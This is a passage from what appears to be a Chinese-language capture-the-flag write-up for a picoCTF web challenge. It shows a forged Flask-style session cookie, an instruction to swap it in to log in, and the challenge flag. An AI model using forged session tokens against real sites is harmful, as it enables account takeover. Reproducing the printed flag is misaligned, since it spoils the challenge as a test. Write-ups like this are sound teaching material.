.eJwlj0uqAjEQAO-StYvuJN1Je5kh_UMRFGZ09Xh3d8B9FVT9lS33OG7l-t4_cSnb3cu1MNCYJGCM0aMxIYRKyljT20LRnIgCZDSrOWJUgGqLLUGTBd2c0HRwAKpwr3zyVbKOMbOZsU4XydXRJYhW1yQnAhkarKHlUuzYc3u_HvE8e3oncRue7khzdfLGxm1Chvvw0fFMY66n9zli_01g-f8CXG0-4Q.DsHuig.Jz1d2DO-LBrOa_8RW8iuOOl78z4
</pre></div>
<p>替换新session登录得到flag</p>
<p>flag:<code>picoCTF{1_id_to_rule_them_all_8f9d57f1}</code></p>
</div>
</div>